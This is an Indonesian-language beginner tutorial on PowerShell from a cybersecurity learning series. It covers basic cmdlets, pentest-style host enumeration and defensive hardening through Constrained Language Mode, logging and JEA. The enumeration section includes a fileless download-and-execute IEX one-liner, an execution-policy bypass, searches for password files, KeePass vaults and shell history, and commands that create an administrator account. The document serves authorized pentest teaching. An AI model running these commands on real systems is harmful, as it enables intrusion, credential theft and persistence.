# PowerShell

> LearnCybersecurity | Basics Series | kodoktheGr3at | 2026

---

<!-- LC-CURRICULUM-START -->
> **ID Kurikulum:** `LC-003` | **Fase 0:** Fondasi
> **Estimasi belajar:** 4-5 jam | **Level:** Pemula
> **Prasyarat:** LC-001
> **Peta buku:** Gray Hat Hacking (bab post-eksploitasi Windows)
<!-- LC-CURRICULUM-END -->

## Daftar Isi

1. Apa itu PowerShell
2. Navigasi direktori
3. Manajemen file & folder
4. Informasi sistem
5. Perintah jaringan
6. User & proses
7. Pipeline & objek
8. Enumerasi host berizin
9. Catatan keamanan: constrained language mode & logging
10. Referensi cepat

---

## Istilah penting

Istilah-istilah ini akan sering muncul di materi.

| Istilah | Artinya |
|:---|:---|
| Shell | Program yang menjalankan perintah yang kamu ketik, seperti PowerShell atau CMD |
| Cmdlet | Perintah PowerShell, selalu bernama `Verb-Noun` (misalnya `Get-Process`) |
| Objek | Output PowerShell bukan teks biasa; ini data dengan field bernama yang bisa kamu pakai |
| Pipeline (`\|`) | Mengalirkan output satu perintah langsung ke perintah berikutnya |
| Alias | Nama pendek untuk cmdlet (`ls`, `dir` sama-sama berarti `Get-ChildItem`) |
| Remoting | Menjalankan perintah PowerShell di mesin lain lewat jaringan |
| Living off the land | Penyerang menyalahgunakan tool bawaan yang tepercaya (seperti PowerShell), bukan malware sendiri |
| Constrained Language Mode | Mode penguncian yang membatasi apa yang boleh dilakukan skrip |

---

## 1. Overview: Apa itu PowerShell

PowerShell adalah shell command-line dan bahasa scripting dari Microsoft, dibangun di atas .NET. Berbeda dengan CMD yang bekerja dengan teks biasa, PowerShell bekerja dengan objek. Setiap output adalah objek .NET lengkap dengan properti dan method, bukan sekadar teks.

Dari sisi cybersecurity, PowerShell penting karena beberapa hal:

- Ini adalah tool post-exploitation paling populer di Windows, misalnya Empire, PowerSploit, dan Nishang.
- Mendukung remoting, yaitu eksekusi command di komputer lain.
- Sering dipakai untuk bypass antivirus/EDR lewat teknik "living off the land", karena PowerShell sudah terpasang bawaan di Windows dan dipercaya secara default.

```powershell
# Open PowerShell
Win + R → type "powershell" → Enter

# Open as Administrator
Win + X → "Windows PowerShell (Admin)" / "Terminal (Admin)"

# Check PowerShell version
PS C:\> $PSVersionTable

# Get help for a cmdlet
PS C:\> Get-Help Get-Process
PS C:\> Get-Help Get-Process -Examples
PS C:\> Get-Help Get-Process -Full

# Update local help files (requires internet + admin)
PS C:\> Update-Help
```

> Konvensi penamaan cmdlet: perintah PowerShell mengikuti pola `Verb-Noun` (misalnya `Get-Process`, `Set-Location`, `New-Item`), sehingga mudah diprediksi dan ditemukan.

---

## 2. Navigasi: Navigasi Direktori

PowerShell mendukung cmdlet native (`Get-ChildItem`, `Set-Location`) sekaligus alias gaya CMD/Unix (`dir`, `cd`, `ls`), agar transisi dari shell lain lebih mudah.

```powershell
# Show current directory
PS C:\> Get-Location
PS C:\> pwd          # alias

# Change directory
PS C:\> Set-Location C:\Users\alex\Desktop
PS C:\> cd C:\Users\alex\Desktop    # alias

# Go up one level
PS C:\Users\alex\Desktop> cd ..

# List contents of current directory
PS C:\> Get-ChildItem
PS C:\> ls           # alias
PS C:\> dir          # alias

# List including hidden files
PS C:\> Get-ChildItem -Force

# List recursively
PS C:\> Get-ChildItem -Recurse

# List only directories
PS C:\> Get-ChildItem -Directory

# List only files matching a pattern
PS C:\> Get-ChildItem -Filter *.txt -Recurse
```

| Cmdlet | Alias | Fungsi |
|--------|-------|--------|
| `Get-Location` | `pwd`, `gl` | Tampilkan direktori saat ini |
| `Set-Location` | `cd`, `sl` | Pindah direktori |
| `Get-ChildItem` | `dir`, `ls`, `gci` | Daftar isi folder |
| `Get-ChildItem -Recurse` | — | Daftar rekursif |
| `Get-ChildItem -Force` | — | Termasuk file tersembunyi |

---

## 3. Manajemen File & Folder

Cmdlet ini dipakai untuk membuat, menyalin, memindahkan, dan menghapus file maupun folder, serta membaca dan mencari konten di dalamnya.

```powershell
# Create a new folder
PS C:\> New-Item -ItemType Directory -Path "newfolder"
PS C:\> mkdir newfolder      # alias

# Create a new empty file
PS C:\> New-Item -ItemType File -Path "file.txt"

# Remove a file or folder
PS C:\> Remove-Item file.txt
PS C:\> rm file.txt          # alias

# Remove a folder AND all its contents
PS C:\> Remove-Item -Path "folder" -Recurse -Force

# Copy a file
PS C:\> Copy-Item file.txt D:\backup\file.txt
PS C:\> cp file.txt D:\backup\        # alias

# Copy a folder recursively
PS C:\> Copy-Item -Path C:\source -Destination D:\dest -Recurse

# Move a file or folder
PS C:\> Move-Item file.txt D:\backup\
PS C:\> mv file.txt D:\backup\        # alias

# Rename a file or folder
PS C:\> Rename-Item oldname.txt newname.txt

# View contents of a text file
PS C:\> Get-Content file.txt
PS C:\> cat file.txt          # alias
PS C:\> type file.txt         # alias

# View only the last N lines (like tail)
PS C:\> Get-Content file.txt -Tail 10

# Search text inside files (like grep/findstr)
PS C:\> Select-String -Path "*.txt" -Pattern "password"
PS C:\> Get-Content file.txt | Select-String "password"

# Find files by name across the filesystem
PS C:\> Get-ChildItem -Path C:\ -Filter *.txt -Recurse -ErrorAction SilentlyContinue
```

| Cmdlet | Alias | Fungsi |
|--------|-------|--------|
| `New-Item` | `ni`, `mkdir` | Buat file/folder baru |
| `Remove-Item` | `rm`, `del`, `rmdir` | Hapus file/folder |
| `Copy-Item` | `cp`, `copy` | Salin file/folder |
| `Move-Item` | `mv`, `move` | Pindah file/folder |
| `Rename-Item` | `ren` | Ganti nama |
| `Get-Content` | `cat`, `type`, `gc` | Tampilkan isi file |
| `Select-String` | `sls` | Cari teks (seperti grep) |

---

## 4. Informasi Sistem

Cmdlet ini dipakai untuk mendapatkan informasi sistem, hardware, dan environment variables. Sebagian besar mengandalkan namespace `CIM`/`WMI`.

```powershell
# Show OS info
PS C:\> Get-ComputerInfo

# Show specific OS details
PS C:\> Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture

# Show environment variables
PS C:\> Get-ChildItem Env:
PS C:\> $env:USERNAME
PS C:\> $env:COMPUTERNAME
PS C:\> $env:PATH

# List installed hotfixes/patches
PS C:\> Get-HotFix

# List installed software
PS C:\> Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version

# Show disk drive info
PS C:\> Get-PSDrive
PS C:\> Get-CimInstance Win32_LogicalDisk

# Show BIOS / hardware info
PS C:\> Get-CimInstance Win32_BIOS
PS C:\> Get-CimInstance Win32_ComputerSystem

# Clear the screen
PS C:\> Clear-Host
PS C:\> cls          # alias
```

| Cmdlet | Fungsi |
|--------|--------|
| `Get-ComputerInfo` | Info sistem lengkap |
| `Get-CimInstance` | Query WMI/CIM (OS, hardware, dll.) |
| `Get-ChildItem Env:` | Tampilkan environment variables |
| `Get-HotFix` | Daftar hotfix terinstal |
| `Get-PSDrive` | Daftar drive/volume |
| `Clear-Host` | Bersihkan layar |

> Catatan pentesting: `Get-HotFix` membantu mengidentifikasi security patch yang belum terpasang, yang bisa jadi indikasi kerentanan yang bisa dieksploitasi.

---

## 5. Perintah Jaringan

PowerShell menyediakan cmdlet networking modern, tapi tetap bisa memanggil tool legacy seperti `ping` dan `ipconfig`.

```powershell
# Show IP configuration (modern cmdlet)
PS C:\> Get-NetIPConfiguration
PS C:\> Get-NetIPAddress

# Legacy equivalent (still works)
PS C:\> ipconfig /all

# Test connectivity to a host
PS C:\> Test-Connection google.com
PS C:\> ping google.com          # legacy alias still works

# Trace the route to a host
PS C:\> Test-NetConnection google.com -TraceRoute

# Test if a specific port is open
PS C:\> Test-NetConnection -ComputerName target.com -Port 443

# Show active network connections
PS C:\> Get-NetTCPConnection

# Show DNS cache
PS C:\> Get-DnsClientCache

# Resolve a domain name (DNS lookup)
PS C:\> Resolve-DnsName google.com

# Flush DNS cache
PS C:\> Clear-DnsClientCache

# Show network adapters
PS C:\> Get-NetAdapter

# Download a file from the web (like curl/wget)
PS C:\> Invoke-WebRequest -Uri http://target.com/file.txt -OutFile file.txt
PS C:\> iwr http://target.com -UseBasicParsing      # alias
```

| Cmdlet | Fungsi |
|--------|--------|
| `Get-NetIPConfiguration` | Konfigurasi IP modern |
| `Test-Connection` | Tes konektivitas (ping) |
| `Test-NetConnection` | Tes port/koneksi spesifik |
| `Get-NetTCPConnection` | Koneksi TCP aktif |
| `Resolve-DnsName` | DNS lookup |
| `Invoke-WebRequest` | HTTP request (seperti curl) |

> Catatan pentesting: `Invoke-WebRequest` (alias `iwr`) dan `Invoke-RestMethod` (`irm`) sering dipakai dalam rantai serangan fileless/in-memory untuk mengunduh dan menjalankan payload langsung dari memori tanpa menyentuh disk.

---

## 6. User & Proses

Cmdlet ini dipakai untuk mengelola user account dan grup, serta memantau proses yang sedang berjalan.

```powershell
# Show current logged-in user
PS C:\> whoami
PS C:\> $env:USERNAME

# Show current user's groups and privileges
PS C:\> whoami /groups
PS C:\> whoami /priv

# List all local user accounts
PS C:\> Get-LocalUser

# Show details of a specific user
PS C:\> Get-LocalUser -Name "alex"

# Create a new local user
PS C:\> New-LocalUser -Name "alex" -Password (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force)

# Add user to local Administrators group
PS C:\> Add-LocalGroupMember -Group "Administrators" -Member "alex"

# List local groups
PS C:\> Get-LocalGroup

# List members of Administrators group
PS C:\> Get-LocalGroupMember -Group "Administrators"

# Delete a user
PS C:\> Remove-LocalUser -Name "alex"

# List running processes
PS C:\> Get-Process
PS C:\> ps          # alias

# Find a specific process
PS C:\> Get-Process | Where-Object {$_.ProcessName -like "*chrome*"}

# Kill a process by name
PS C:\> Stop-Process -Name "notepad" -Force

# Kill a process by PID
PS C:\> Stop-Process -Id 1234 -Force

# Start a new process
PS C:\> Start-Process notepad.exe
```

| Cmdlet | Fungsi |
|--------|--------|
| `Get-LocalUser` | Daftar semua user lokal |
| `New-LocalUser` | Buat user baru |
| `Add-LocalGroupMember` | Tambah ke grup |
| `Get-LocalGroupMember` | Tampilkan anggota grup |
| `Get-Process` | Daftar proses berjalan |
| `Stop-Process` | Hentikan proses |
| `Start-Process` | Jalankan proses baru |

> Penting: `New-LocalUser` dan `Add-LocalGroupMember` mengharuskan PowerShell dijalankan sebagai Administrator.

---

## 7. Pipeline & Objek

Fitur utama PowerShell adalah pipeline berbasis objek. Output dari satu cmdlet, yaitu objek lengkap dengan properti, bisa langsung dikirim ke cmdlet berikutnya tanpa parsing teks. Ini berbeda dari pipe di Linux, yang meneruskan teks mentah antar perintah.

```powershell
# Filter objects with Where-Object
PS C:\> Get-Process | Where-Object {$_.CPU -gt 100}

# Sort objects
PS C:\> Get-Process | Sort-Object CPU -Descending

# Select specific properties only
PS C:\> Get-Process | Select-Object Name, Id, CPU

# Format output as a table
PS C:\> Get-Process | Format-Table -AutoSize

# Format output as a list
PS C:\> Get-Process | Format-List

# Measure / count objects
PS C:\> Get-ChildItem | Measure-Object

# Export results to CSV
PS C:\> Get-Process | Export-Csv processes.csv -NoTypeInformation

# Convert to JSON (useful for scripting/exfil)
PS C:\> Get-Process | Select-Object Name, Id | ConvertTo-Json

# ForEach loop over pipeline objects
PS C:\> Get-ChildItem | ForEach-Object { Write-Host $_.Name }
```

| Cmdlet | Alias | Fungsi |
|--------|-------|--------|
| `Where-Object` | `?`, `where` | Filter objek |
| `Select-Object` | `select` | Pilih properti tertentu |
| `Sort-Object` | `sort` | Urutkan objek |
| `ForEach-Object` | `%`, `foreach` | Loop tiap objek |
| `Format-Table` | `ft` | Format sebagai tabel |
| `ConvertTo-Json` | — | Konversi ke JSON |

---

## 8. Enumerasi Host Berizin

Pada engagement yang berizin atau di lab sendiri, PowerShell berguna untuk inventarisasi host dan audit konfigurasi. Gunakan perintah ini hanya pada sistem yang memang boleh Anda periksa.

```powershell
# ── Basic Recon ─────────────────────────────────────
whoami /all                                    # full identity, groups, privileges
$env:USERNAME, $env:COMPUTERNAME               # quick context
Get-ComputerInfo | Select OsName, OsVersion    # OS details

# ── Execution Policy (often needs bypassing) ────────
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process       # temporary, current session only

# ── User & Group Enumeration ────────────────────────
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# ── Network Enumeration ─────────────────────────────
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# ── Files & Credentials Hunting ─────────────────────
Get-ChildItem -Path C:\ -Include *password*,*.kdbx -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"
Get-ChildItem -Path C:\Users -Include *.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String "password"

# ── PowerShell History (often contains credentials) ─
Get-Content (Get-PSReadlineOption).HistorySavePath

# ── Scheduled Tasks & Services (priv-esc vectors) ───
Get-ScheduledTask | Select TaskName, State
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-CimInstance Win32_Service | Select Name, PathName, StartMode

# ── Installed Software & Patches ────────────────────
Get-HotFix | Sort-Object InstalledOn -Descending
Get-CimInstance Win32_Product | Select Name, Version

# ── Download & execute in-memory (fileless technique) ───
IEX (New-Object Net.WebClient).DownloadString('http://target.com/script.ps1')
```

> Catatan: perintah ini ditujukan hanya untuk penetration testing berizin dan lingkungan CTF. Banyak solusi EDR/AV yang menandai `IEX`, `DownloadString`, dan execution-policy bypass, jadi gunakan dengan kesadaran bahwa ini bisa terdeteksi.

---

## 9. Catatan Keamanan: Hardening Admin, Constrained Language & Logging

PowerShell sering disalahgunakan oleh malware, sehingga kontrol admin dan logging termasuk lapisan pertahanan yang penting di Windows.

```powershell
# ── Language mode (defense posture) ─────────────────────────
$ExecutionContext.SessionState.LanguageMode
# FullLanguage | ConstrainedLanguage | RestrictedLanguage | NoLanguage
# Constrained Language Mode (CLM) blocks most .NET / COM abuse while
# allowing approved cmdlets — pair with AppLocker/WDAC script rules.

# ── Execution policy (necessary but NOT a security boundary) ─
Get-ExecutionPolicy -List
# Prefer: AllSigned / RemoteSigned for admins; enforce via GPO.
# Attackers can bypass process-scoped policy — rely on WDAC + logging.

# ── Script Block Logging / Module Logging / Transcription ────
# Enable via GPO (recommended) under:
# Computer Config → Admin Templates → Windows Components → Windows PowerShell
#  - Turn on PowerShell Script Block Logging
#  - Turn on Module Logging (core modules + *)
#  - Turn on PowerShell Transcription (central share)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20

# ── Just Enough Administration (JEA) ─────────────────────────
# Expose only approved cmdlets/functions to remote admins
Get-PSSessionConfiguration | Format-Table Name, Permission

# ── Least privilege for interactive admins ───────────────────
# Daily work: standard user; elevate only for change windows
whoami /groups | findstr /i "Admin High Mandatory"
```

| Kontrol | Fungsi |
|---------|--------|
| Constrained Language Mode | Batasi penyalahgunaan .NET/COM berbahaya |
| WDAC / AppLocker | Izinkan hanya script bertanda tangan/disetujui |
| Script Block Logging | Audit isi script |
| Transcription | Rekam sesi admin |
| JEA | Minimalkan permukaan admin remote |
| AMSI + Defender | Deteksi script berbahaya |

> Defense-first: execution policy saja bukan security boundary. Gabungkan WDAC/AppLocker, CLM, Script Block Logging, dan JEA, lalu pantau Event ID 4104/4103 untuk aktivitas admin yang anomali.

---

## 10. Tabel Ringkasan Perintah

| Cmdlet | Fungsi | Butuh admin? |
|--------|--------|---------------|
| `Get-ChildItem` | Daftar isi folder | Tidak |
| `Set-Location` | Pindah direktori | Tidak |
| `New-Item` / `Remove-Item` | Buat/hapus file atau folder | Tidak (file sistem: ya) |
| `Copy-Item` / `Move-Item` | Salin/pindah file | Tidak |
| `Get-Content` | Tampilkan isi file | Tidak |
| `Get-ComputerInfo` | Info sistem | Tidak |
| `Get-NetIPConfiguration` | Konfigurasi jaringan | Tidak |
| `Test-Connection` | Tes jaringan (ping) | Tidak |
| `Get-NetTCPConnection` | Koneksi aktif | Tidak |
| `whoami /all` | Identitas user lengkap | Tidak |
| `New-LocalUser` | Buat user | Ya |
| `Add-LocalGroupMember` | Kelola grup | Ya |
| `Get-Process` / `Stop-Process` | Kelola proses | Tidak (proses tertentu: ya) |
| `Get-ScheduledTask` | Scheduled task | Tidak |
| `Invoke-WebRequest` | HTTP request | Tidak |

---

## Contoh Alur Kerja Praktis

```powershell
# ── SCENARIO: Quick Windows host enumeration ─────────

# 1. Identify who and where you are
whoami /all
Get-ComputerInfo | Select-Object OsName, OsVersion, OsArchitecture

# 2. Check network setup
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# 3. Enumerate users and groups
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"

# 4. Look for interesting files
Get-ChildItem -Path C:\Users -Include *password*,*.config -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\Desktop\*.txt -Pattern "password"

# 5. Check scheduled tasks and services for priv-esc
Get-ScheduledTask | Select-Object TaskName, State
Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode

# 6. Check running processes
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

---

## Referensi Cepat

```powershell
# ── NAVIGATION ──────────────────────────────────────────────
Set-Location <path>            # cd        — change directory
Get-Location                   # pwd       — show current directory
Get-ChildItem                  # dir, ls   — list contents
Get-ChildItem -Recurse         #           — list recursively

# ── FILE / FOLDER ───────────────────────────────────────────
New-Item -ItemType Directory <name>    # mkdir   — create folder
Remove-Item -Recurse -Force <name>     # rm /s   — delete folder + contents
Copy-Item <src> <dest>                 # cp      — copy file
Move-Item <src> <dest>                 # mv      — move file/folder
Get-Content <file>                     # cat     — view file contents
Select-String -Path <file> -Pattern "<text>"   # grep — search inside file

# ── SYSTEM INFO ─────────────────────────────────────────────
Get-ComputerInfo               # full system info
Get-CimInstance Win32_OperatingSystem   # OS details
Get-HotFix                     # installed patches
Get-ChildItem Env:              # environment variables
Clear-Host                     # cls — clear screen

# ── NETWORK ──────────────────────────────────────────────────
Get-NetIPConfiguration         # IP config
Test-Connection <host>         # ping
Test-NetConnection <host> -Port <port>   # check specific port
Get-NetTCPConnection           # active connections
Resolve-DnsName <domain>       # DNS lookup
Invoke-WebRequest -Uri <url> -OutFile <file>   # download (curl-like)

# ── USERS / PROCESSES ───────────────────────────────────────
whoami /all                    # current user, groups, privileges
Get-LocalUser                  # list local users
New-LocalUser -Name <name> -Password <securestring>
Add-LocalGroupMember -Group "Administrators" -Member <name>
Get-Process                    # list running processes
Stop-Process -Name <name> -Force   # kill process by name

# ── PIPELINE / OBJECTS ───────────────────────────────────────
Get-Process | Where-Object {$_.CPU -gt 100}    # filter
Get-Process | Sort-Object CPU -Descending      # sort
Get-Process | Select-Object Name, Id           # select fields
Get-Process | Format-Table -AutoSize           # format as table
Get-Process | ConvertTo-Json                   # convert to JSON

# ── DEFENSE / HARDENING CHECKS ──────────────────────────────
$ExecutionContext.SessionState.LanguageMode   # expect ConstrainedLanguage where enforced
Get-ExecutionPolicy -List                     # policy inventory (not a boundary alone)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10
Get-PSSessionConfiguration | Format-Table Name, Permission
```

---

> Referensi & Sumber Buku:
> - Peter Kim — *The Hacker Playbook 3* (`~/Documents/Books/CyberSec/Ethical Hacking/`) — konteks metodologi berizin
> - Georgia Weidman — *Penetration Testing: A Hands-On Introduction to Hacking* (`~/Documents/Books/CyberSec/Ethical Hacking/`)
> - Allen Harper et al. — *Gray Hat Hacking* (`~/Documents/Books/CyberSec/Handbook/`)
> - Microsoft Docs — [PowerShell Security](https://learn.microsoft.com/en-us/powershell/scripting/security/overview) · Script Block Logging · JEA · Constrained Language Mode
> - [HackTheBox Academy - Windows Fundamentals](https://academy.hackthebox.com)
> - `Get-Help <cmdlet> -Full`

> LearnCybersecurity | Basics Series | kodoktheGr3at | 2026
> Repositori: [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)
> Masukan & kontribusi dipersilakan. Buka issue atau PR kalau menemukan kesalahan.
